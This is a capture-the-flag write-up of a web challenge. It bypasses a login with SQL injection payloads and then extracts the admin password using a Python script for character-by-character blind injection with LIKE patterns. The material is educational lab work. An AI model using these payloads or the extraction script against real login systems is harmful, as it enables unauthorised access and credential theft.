# Are you admin

> Login with the admin !
> http://52.78.16.36:8881/web1/index.php

So we are given a username and password field. I tried username `admin` and password `' or 1=1;#` and it worked - it just said "Hello admin" - so it is vulnerable to SQL Injection

I assumed that the query was something like this:
```SQL
SELECT <thing> FROM <thetable> WHERE id = '{id}' AND pw = '{pw}';
```

We see that the url is `http://52.78.16.36:8881/web1/?id=admin&pw=password`, so the column name is probably `pw`, so we can inject:
```
' or 1=1 or pw LIKE '%';#
```
We then replace the `%` with increasingly many `_` until we find one that matches - oh wait it says "no hack", so that probably does not work. Whatever since `%` is not filtered lets use that to get the password:
```python
import requests
base = "http://52.78.16.36:8881/web1/"

arr = []
id = 40
print(f"base url: {base}")
while True:
    char = chr(id)
    pw = f"' OR pw LIKE '{''.join(arr)}{char}%';#"
    params = {'id': 'admin', 'pw': pw}
    res = requests.get(base, params=params)
    if id == 127:
        print("end: "+pw)
        break
    elif 'Hello admin' in res.text:
        arr.append(char)
        id = 40
        print("Correct: "+pw)
    else:
        print("Wrong: "+pw)
        id += 1
```

the result is `end: ' OR pw LIKE 'ADMIN123PW⌂%';#`, and ignoring the last few bits we get `ADMIN123PW`, but that still doesnt give us the flag. Since `LIKE` is not case-senstive, and we can't using `SUBSTRING` since I dont know the table name, we can only try for different combinations of upper and lowercase. I tried all lowercase instead (i.e. `admin123pw`) and I got the flag (scuffed lmao)